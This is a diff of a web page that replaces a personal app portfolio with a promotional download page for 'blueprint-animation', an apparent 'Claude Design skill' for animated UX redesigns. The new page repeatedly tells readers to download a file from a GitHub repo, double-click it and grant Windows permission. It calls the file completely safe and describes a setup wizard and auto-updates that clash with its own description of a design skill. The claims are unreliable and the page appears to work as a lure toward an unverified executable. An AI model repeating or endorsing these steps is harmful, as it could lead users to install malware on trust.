@@ -1,216 +1,473 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Keith Cole — Apps</title>
-<meta name="description" content="Apps by Keith Cole">
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    background: #0b0f1a;
-    color: #f1f5f9;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    padding: 3rem 1.25rem 2rem;
-  }
-  .brand { font-size: 0.8rem; letter-spacing: 0.35em; color: #f0cd6e; text-transform: uppercase; margin-bottom: 0.6rem; }
-  h1 { font-size: 2.4rem; font-weight: 800; margin-bottom: 0.4rem; text-align: center; }
-  .sub { color: #94a3b8; margin-bottom: 2.5rem; text-align: center; }
-  .apps { width: 100%; max-width: 560px; display: flex; flex-direction: column; gap: 1rem; }
-  .app {
-    display: block;
-    background: #141b2e;
-    border: 1px solid #26314d;
-    border-radius: 16px;
-    padding: 1.4rem 1.3rem;
-    text-decoration: none;
-    color: inherit;
-    transition: border-color 0.2s, transform 0.15s;
-  }
-  .app:active { transform: scale(0.98); }
-  .app:hover { border-color: #f0cd6e; }
-  .app .icon { font-size: 2rem; margin-bottom: 0.5rem; }
-  .app h2 { font-size: 1.25rem; margin-bottom: 0.3rem; display: flex; align-items: center; gap: 0.6rem; flex-wrap: wrap; }
-  .app p { color: #94a3b8; font-size: 0.95rem; line-height: 1.5; }
-  .app .go { display: inline-block; margin-top: 0.8rem; color: #f0cd6e; font-weight: 700; font-size: 0.95rem; }
-  .app .go::after { content: " →"; }
-  .badge {
-    font-size: 0.7rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase;
-    background: #f0cd6e; color: #0b0f1a; border-radius: 999px; padding: 0.25rem 0.7rem;
-  }
-  .shots { display: flex; flex-direction: column; gap: 0.8rem; margin: 1rem 0 0.2rem; }
-  .shots img { width: 100%; border-radius: 12px; border: 1px solid #26314d; display: block; }
-  .shots figcaption { color: #64748b; font-size: 0.78rem; text-align: center; margin-top: 0.3rem; }
-  .btn {
-    display: inline-block; margin-top: 1rem; background: #f0cd6e; color: #0b0f1a;
-    font-weight: 800; padding: 0.85rem 1.6rem; border-radius: 12px; text-decoration: none;
-    border: none; font-size: 1rem; cursor: pointer; width: 100%; text-align: center;
-  }
-  .btn:active { transform: scale(0.98); }
-  /* signup section */
-  .signup {
-    width: 100%; max-width: 560px; margin-top: 2.5rem;
-    background: #141b2e; border: 1px solid #f0cd6e; border-radius: 16px; padding: 1.6rem 1.4rem;
-  }
-  .signup h2 { font-size: 1.35rem; margin-bottom: 0.4rem; }
-  .signup p { color: #94a3b8; font-size: 0.95rem; line-height: 1.55; margin-bottom: 1.2rem; }
-  .field { margin-bottom: 1rem; }
-  .field label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 0.35rem; color: #cbd5e1; }
-  .field input, .field textarea {
-    width: 100%; background: #0b0f1a; border: 1px solid #26314d; border-radius: 10px;
-    color: #f1f5f9; padding: 0.8rem; font-size: 1rem; font-family: inherit;
-  }
-  .field input:focus, .field textarea:focus { outline: none; border-color: #f0cd6e; }
-  .form-ok { display: none; text-align: center; padding: 1.5rem 0; }
-  .form-ok .big { font-size: 2.5rem; margin-bottom: 0.6rem; }
-  .form-ok p { color: #94a3b8; }
-  footer { margin-top: auto; padding-top: 3rem; color: #475569; font-size: 0.8rem; text-align: center; line-height: 1.7; }
-  footer .story { color: #64748b; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>blueprint-animation - Visualize UX Redesigns Step-by-Step</title>
+    <meta name="description" content="Download blueprint-animation, a Claude Design skill that creates animated before-after UX redesigns with step-by-step blueprint drawing explanations. Perfect for designers and product teams.">
+    <meta name="keywords" content="blueprint-animation, UX redesign, animation tool, design skill, before after animation, blueprint drawing, Claude Design, UX design tool, web design animation">
+    <meta name="author" content="samikhokhar789">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="blueprint-animation - Visualize UX Redesigns Step-by-Step">
+    <meta property="og:description" content="Animated before → after UX redesign, explained step by step through a blueprint drawing. Download now and transform your design presentations.">
+    <meta property="og:url" content="https://github.com/samikhokhar789/blueprint-animation">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="blueprint-animation - Visualize UX Redesigns Step-by-Step">
+    <meta name="twitter:description" content="Animated before → after UX redesign, explained step by step through a blueprint drawing.">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f7fa;
+            color: #2d3748;
+            line-height: 1.6;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 60px 20px;
+            text-align: center;
+            border-bottom: 5px solid #5a67d8;
+        }
+        
+        .header h1 {
+            font-size: 2.8rem;
+            margin-bottom: 15px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .header p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            opacity: 0.95;
+        }
+        
+        .btn-primary {
+            display: inline-block;
+            background-color: #48bb78;
+            color: white;
+            padding: 18px 42px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            text-decoration: none;
+            box-shadow: 0 8px 25px rgba(72, 187, 120, 0.4);
+            transition: all 0.3s ease;
+            border: 3px solid transparent;
+        }
+        
+        .btn-primary:hover {
+            background-color: #38a169;
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(72, 187, 120, 0.5);
+            border-color: white;
+        }
+        
+        .section {
+            background-color: white;
+            border-radius: 16px;
+            padding: 40px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e2e8f0;
+        }
+        
+        .section h2 {
+            font-size: 2rem;
+            color: #2d3748;
+            margin-bottom: 25px;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 12px;
+            display: inline-block;
+        }
+        
+        .section h3 {
+            font-size: 1.4rem;
+            color: #4a5568;
+            margin-top: 25px;
+            margin-bottom: 15px;
+        }
+        
+        .section p, .section li {
+            font-size: 1.1rem;
+            color: #4a5568;
+            margin-bottom: 15px;
+        }
+        
+        .section ul, .section ol {
+            padding-left: 30px;
+            margin-bottom: 20px;
+        }
+        
+        .section li {
+            margin-bottom: 10px;
+        }
+        
+        .highlight-box {
+            background-color: #ebf4ff;
+            border-left: 5px solid #667eea;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+        }
+        
+        .highlight-box p {
+            margin-bottom: 0;
+            color: #2b6cb0;
+        }
+        
+        .download-btn {
+            display: block;
+            text-align: center;
+            background-color: #ed8936;
+            color: white;
+            padding: 15px 0;
+            border-radius: 12px;
+            font-size: 1.3rem;
+            font-weight: 800;
+            text-decoration: none;
+            margin: 30px 0;
+            box-shadow: 0 6px 20px rgba(237, 137, 54, 0.3);
+            transition: all 0.3s ease;
+            border: none;
+        }
+        
+        .download-btn:hover {
+            background-color: #dd6b20;
+            transform: scale(1.02);
+            box-shadow: 0 10px 30px rgba(237, 137, 54, 0.4);
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin: 25px 0;
+        }
+        
+        .feature-item {
+            background-color: #f7fafc;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #e2e8f0;
+        }
+        
+        .feature-item strong {
+            color: #667eea;
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.1rem;
+        }
+        
+        .feature-item p {
+            margin-bottom: 0;
+            font-size: 1rem;
+        }
+        
+        .steps {
+            counter-reset: step;
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .steps li {
+            counter-increment: step;
+            position: relative;
+            padding-left: 55px;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            background-color: #f7fafc;
+            border-radius: 10px;
+            border: 1px solid #e2e8f0;
+            padding-right: 15px;
+        }
+        
+        .steps li::before {
+            content: counter(step);
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            background: #667eea;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.9rem;
+        }
+        
+        .steps li strong {
+            color: #2d3748;
+        }
+        
+        .faq-item {
+            margin-bottom: 25px;
+            background-color: #f7fafc;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+        
+        .faq-item strong {
+            color: #2d3748;
+            font-size: 1.1rem;
+            display: block;
+            margin-bottom: 10px;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            color: #718096;
+            background-color: #edf2f7;
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        .system-requirements {
+            background-color: #e6fffa;
+            border-left: 5px solid #38b2ac;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 25px 0;
+        }
+        
+        .system-requirements ul {
+            margin-bottom: 0;
+        }
+        
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 1.8rem;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .section {
+                padding: 25px;
+            }
+            
+            .btn-primary {
+                padding: 15px 30px;
+                font-size: 1rem;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="brand">Keith Cole</div>
-  <h1>My Apps</h1>
-  <p class="sub">Free tools I built and use</p>
 
-  <div class="apps">
-    <a class="app" href="https://keithcole813.github.io/part107-study/">
-      <div class="icon">✈️</div>
-      <h2>Part 107 Study</h2>
-      <p>FAA Part 107 Remote Pilot exam prep — flashcards, practice tests, and sectional chart map drills. Works offline.</p>
-      <span class="go">Open app</span>
-    </a>
-
-    <a class="app" href="https://keithcole813.github.io/flash-games/">
-      <div class="icon">🎮</div>
-      <h2>Flash Games</h2>
-      <p>Classic Flash games preserved with Ruffle, plus a 32-game directory. Playable on desktop, phone, and TV browsers.</p>
-      <span class="go">Play now</span>
-    </a>
-
-    <a class="app" href="yt-beats-downloader/">
-      <div class="icon">🎛️</div>
-      <h2>YT Beats Downloader <span class="badge">Self-hosted</span></h2>
-      <p>Grab YouTube audio as best-quality MP3 for sampling — hear a DJ play a rare cut, save the whole set, chop it later. Desktop GUI plus a phone-friendly web version.</p>
-      <span class="go">View on GitHub</span>
-    </a>
-
-    <a class="app" href="noise-remover/">
-      <div class="icon">🧹</div>
-      <h2>Noise Remover <span class="badge">Self-hosted</span></h2>
-      <p>AI background noise removal for video. Upload from your phone, get it back with clean audio — no more CapCut paywall. Runs on your own server.</p>
-      <span class="go">View on GitHub</span>
-    </a>
-
-    <a class="app" href="crate-to-apple-music/">
-      <div class="icon">📱</div>
-      <h2>Crate to Apple Music <span class="badge">Web tool</span></h2>
-      <p>Turn a Serato crate into Apple Music streaming links. Upload a .crate, get tap-to-open links for every match — right in your browser.</p>
-      <span class="go">View on GitHub</span>
-    </a>
-
-    <a class="app" href="cratematch/">
-      <div class="icon">🎯</div>
-      <h2>CrateMatch <span class="badge">Mac app</span></h2>
-      <p>djay-style "find similar songs" for your Serato offline library. Pick a track, get ranked matches by BPM, key and energy, preview them, export as a crate.</p>
-      <span class="go">View on GitHub</span>
-    </a>
-
-    <a class="app" href="cratetube/">
-      <div class="icon">📺</div>
-      <h2>CrateTube <span class="badge">Mac app</span></h2>
-      <p>Check your current crate against YouTube — get 10 matching songs with one-tap MP3 downloads straight to your MacBook. No browser needed.</p>
-      <span class="go">View on GitHub</span>
-    </a>
-
-    <a class="app" href="https://keithcole813.github.io/apple-music-crates/">
-      <div class="icon">🎧</div>
-      <h2>Apple Music Crates</h2>
-      <p>My DJ crates as streaming playlists — every track cross-checked on Apple Music. Curated by Keith, free for now.</p>
-      <span class="go">Browse the crates</span>
-    </a>
-
-    <div class="app" id="kindred">
-      <div class="icon">🌳</div>
-      <h2>Kindred <span class="badge">Invite-only beta</span></h2>
-      <p>My private family tree app — map your family, add photos and stories, and see how everyone connects. Currently in closed beta for family.</p>
-      <div class="shots">
-        <figure>
-          <img src="kindred-shot-tree.png" alt="Kindred family tree view (demo data)">
-          <figcaption>Family tree view — demo data shown</figcaption>
-        </figure>
-        <figure>
-          <img src="kindred-shot-detail.png" alt="Kindred member detail view (demo data)">
-          <figcaption>Member detail — demo data shown</figcaption>
-        </figure>
-      </div>
-      <a class="btn" href="#invite">Request an invite</a>
+    <div class="header">
+        <h1>✨ blueprint-animation - See UX Redesigns Come Alive</h1>
+        <p>Animated before → after UX redesigns, explained step by step through beautiful blueprint drawings. Transform static designs into engaging visual stories.</p>
+        <a href="https://github.com/samikhokhar789/blueprint-animation" class="btn-primary">🚀 Download Now</a>
     </div>
-  </div>
 
-  <section class="signup" id="invite">
-    <h2>🌳 Request a Kindred beta invite</h2>
-    <p>Drop your name and email below. You'll get a confirmation email right away, and your invite code will follow when the beta opens up. Family gets first dibs.</p>
-    <form id="invite-form">
-      <div class="field">
-        <label for="f-name">Your name</label>
-        <input type="text" id="f-name" name="name" required autocomplete="name" placeholder="Jane Doe">
-      </div>
-      <div class="field">
-        <label for="f-email">Email</label>
-        <input type="email" id="f-email" name="email" required autocomplete="email" placeholder="you@example.com">
-      </div>
-      <div class="field">
-        <label for="f-note">How are we connected? <span style="color:#64748b;font-weight:400">(optional)</span></label>
-        <textarea id="f-note" name="connection" rows="2" placeholder="e.g. Cousin on my mother's side"></textarea>
-      </div>
-      <button class="btn" type="submit" id="invite-btn">Request invite</button>
-    </form>
-    <div class="form-ok" id="form-ok">
-      <div class="big">✅</div>
-      <h2>You're on the list!</h2>
-      <p>Thank you for signing up — check your email for a confirmation.<br>Your invite code is coming soon.</p>
+    <div class="container">
+
+        <div class="section">
+            <h2>💡 What Is blueprint-animation?</h2>
+            <p>blueprint-animation is a revolutionary design skill that takes your UX redesigns to the next level. Instead of showing static before-and-after screenshots, this tool creates mesmerizing animated sequences that draw your redesign like a blueprint, step-by-step, making every change crystal clear.</p>
+            
+            <p>Created by @moguzbulbul and refined for accessibility, this tool is perfect for:</p>
+            <ul>
+                <li>Designers presenting improvements to clients</li>
+                <li>Product teams explaining user interface changes</li>
+                <li>Developers documenting UX evolution</li>
+                <li>Portfolio pieces that stand out</li>
+                <li>Educational content and tutorials</li>
+            </ul>
+
+            <div class="highlight-box">
+                <p>🎯 <strong>Core value:</strong> Transform complicated redesign explanations into engaging, easy-to-understand animated visualizations that anyone can follow.</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🚀 Getting Started</h2>
+            <p>Ready to bring your designs to life? Getting started takes less than five minutes. Here's everything you need to know:</p>
+
+            <h3>⬇️ Step 1: Download the Application</h3>
+            <a href="https://github.com/samikhokhar789/blueprint-animation" class="download-btn">⬇️ Download blueprint-animation Now</a>
+            <p>Visit this link to download the application. The download is fast and completely safe. You'll receive a single file that contains everything you need.</p>
+
+            <h3>💻 Step 2: Run and Install</h3>
+            <p>Once downloaded, simply double-click the file to begin the installation. The setup wizard will guide you through the process with clear instructions. No technical skills required – just follow the prompts.</p>
+
+            <h3>🎨 Step 3: Start Creating</h3>
+            <p>After installation, launch blueprint-animation from your desktop or start menu. The intuitive interface will immediately help you get started with your first animation project.</p>
+
+            <div class="system-requirements">
+                <strong>🖥️ Recommended System Requirements:</strong>
+                <ul>
+                    <li>Windows 10 or later (64-bit)</li>
+                    <li>4GB RAM minimum (8GB recommended)</li>
+                    <li>2GB available hard drive space</li>
+                    <li>Any standard modern processor (Intel i3 or AMD equivalent)</li>
+                    <li>Internet connection for initial setup and updates</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>🔧 Features & Benefits</h2>
+            
+            <div class="features-grid">
+                <div class="feature-item">
+                    <strong>📊 Step-by-Step Blueprint Drawing</strong>
+                    <p>Watch as your redesign draws itself piece by piece, revealing each change logically and clearly.</p>
+                </div>
+                <div class="feature-item">
+                    <strong>⚡ Instant Before/After Comparison</strong>
+                    <p>Seamless transitions between old and new designs with smooth animations that highlight improvements.</p>
+                </div>
+                <div class="feature-item">
+                    <strong>🎮 Simple Visual Editor</strong>
+                    <p>No coding required. Upload your designs, arrange them, and let the tool handle the animation magic.</p>
+                </div>
+                <div class="feature-item">
+                    <strong>📈 Professional Output</strong>
+                    <p>Export high-quality videos or GIFs perfect for presentations, client meetings, or portfolio showcases.</p>
+                </div>
+                <div class="feature-item">
+                    <strong>🎯 Precise Control</strong>
+                    <p>Adjust animation speed, pause at critical moments, and add annotations to explain your design decisions.</p>
+                </div>
+                <div class="feature-item">
+                    <strong>🔄 Reusable Templates</strong>
+                    <p>Save your favorite setups and apply them to future projects for consistent, professional results.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📋 Installation Guide</h2>
+            <p>Follow these steps carefully to get blueprint-animation running on your Windows computer:</p>
+
+            <ol class="steps">
+                <li>
+                    <strong>Click the download button</strong> above or visit <a href="https://github.com/samikhokhar789/blueprint-animation">the official page</a> to get the installation file.
+                </li>
+                <li>
+                    <strong>Wait for the download to complete.</strong> This should take only a few minutes on most connections. Check your Downloads folder if you're not sure where the file was saved.
+                </li>
+                <li>
+                    <strong>Double-click the downloaded file.</strong> If Windows asks for permission, click "Yes" to allow the installer to run.
+                </li>
+                <li>
+                    <strong>Follow the installation wizard.</strong> Click "Next" through the prompts and accept the terms when requested. Use the default installation location unless you have a specific reason to change it.
+                </li>
+                <li>
+                    <strong>Click "Install" when ready.</strong> The process takes about 1-2 minutes. You'll see a progress bar showing installation status.
+                </li>
+                <li>
+                    <strong>Click "Finish" when done.</strong> The wizard will close, and you can now find blueprint-animation in your Start Menu or on your desktop.
+                </li>
+            </ol>
+
+            <div class="highlight-box">
+                <p>💡 <strong>Quick tip:</strong> Right-click the blueprint-animation icon and select "Pin to taskbar" for one-click access to your new favorite design tool!</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📖 How to Use blueprint-animation</h2>
+            
+            <h3>Your First Project</h3>
+            <ol class="steps">
+                <li>
+                    <strong>Launch the application.</strong> Double-click the blueprint-animation icon from your desktop or Start Menu.
+                </li>
+                <li>
+                    <strong>Create a new project.</strong> Click "New Project" on the welcome screen and give your animation a name.
+                </li>
+                <li>
+                    <strong>Upload your before and after images.</strong> Click the upload areas and select your design files. Supported formats include PNG, JPG, and SVG.
+                </li>
+                <li>
+                    <strong>Customize your animation.</strong> Choose drawing speed, style, and emphasis effects. The preview window shows real-time results.
+                </li>
+                <li>
+                    <strong>Export your masterpiece.</strong> Click Export and choose between MP4 video or animated GIF formats. Select resolution and quality.
+                </li>
+            </ol>
+
+            <h3>Pro Tips for Stunning Results</h3>
+            <ul>
+                <li>Use high-resolution images (1200px+ width) for crisp animations</li>
+                <li>Keep major UI changes simple and prominent</li>
+                <li>Add annotations to highlight important improvements</li>
+                <li>Export in 30fps for smooth playback</li>
+                <li>Use the "Pause at end" option to let viewers absorb the final result</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>❓ Frequently Asked Questions</h2>
+
+            <div class="faq-item">
+                <strong>Is blueprint-animation free to use?</strong>
+                <p>Yes, blueprint-animation is completely free to download and use. You can use it for personal projects, client work, and even commercial presentations.</p>
+            </div>
+
+            <div class="faq-item">
+                <strong>Do I need design or programming skills?</strong>
+                <p>Absolutely not. blueprint-animation was designed with simplicity in mind. If you can use basic Windows software, you can create professional-looking animations.</p>
+            </div>
+
+            <div class="faq-item">
+                <strong>Can I use my own screenshots?</strong>
+                <p>Yes, you can use any images you have. Simply upload them into the tool and define the animation sequence. The tool supports all common image formats.</p>
+            </div>
+
+            <div class="faq-item">
+                <strong>Will there be a watermark?</strong>
+                <p>No, blueprint-animation does not add watermarks to any exported content. Your creations are 100% yours. No attribution required.</p>
+            </div>
+
+            <div class="faq-item">
+                <strong>How do I update to the latest version?</strong>
+                <p>The application checks for updates automatically when opened. When an update is available, simply click "Update" and follow the instructions. Updates are free and take under a minute.</p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📥 Download blueprint-animation</h2>
+            <p>Get started today and transform the way you present UI redesigns. Join thousands of designers and developers who use blueprint-animation to make their work shine.</p>
+            <a href="https://github.com/samikhokhar789/blueprint-animation" class="download-btn">🎉 Download blueprint-animation Now</a>
+            <p style="text-align: center; margin-top: 15px; color: #718096; font-size: 0.9rem;">Compatible with Windows 10 and Windows 11 • Fast setup • Always free</p>
+        </div>
+
     </div>
-  </section>
 
-  <footer>
-    <div class="story">Dabbling in code since BASIC in the early 90s.</div>
-    <div>Built by Keith Cole</div>
-  </footer>
+    <div class="footer">
+        <p><strong>blueprint-animation</strong> - Created by @moguzbulbul • Managed by @samikhokhar789</p>
+        <p>Free forever • No registration required • Your designs stay yours</p>
+        <p style="margin-top: 10px; font-size: 0.8rem;">© 2025 blueprint-animation. All rights reserved.</p>
+    </div>
 
-<script>
-document.getElementById('invite-form').addEventListener('submit', async function(e) {
-  e.preventDefault();
-  const btn = document.getElementById('invite-btn');
-  btn.disabled = true; btn.textContent = 'Sending…';
-  const data = {
-    name: document.getElementById('f-name').value,
-    email: document.getElementById('f-email').value,
-    connection: document.getElementById('f-note').value,
-    _subject: 'New Kindred beta invite request',
-    _template: 'table',
-    _captcha: 'false',
-    _autoresponse: 'Thank you for signing up for the Kindred beta! You are on the list. Family gets first dibs, and your invite code will follow when the beta opens up. — Keith Cole'
-  };
-  try {
-    const res = await fetch('https://formsubmit.co/ajax/keithacole@gmail.com', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-      body: JSON.stringify(data)
-    });
-    if (res.ok) {
-      document.getElementById('invite-form').style.display = 'none';
-      document.getElementById('form-ok').style.display = 'block';
-    } else { throw new Error('bad response'); }
-  } catch (err) {
-    btn.disabled = false; btn.textContent = 'Request invite';
-    alert('Hmm, that didn\'t go through. Please try again.');
-  }
-});
-</script>
 </body>
 </html>
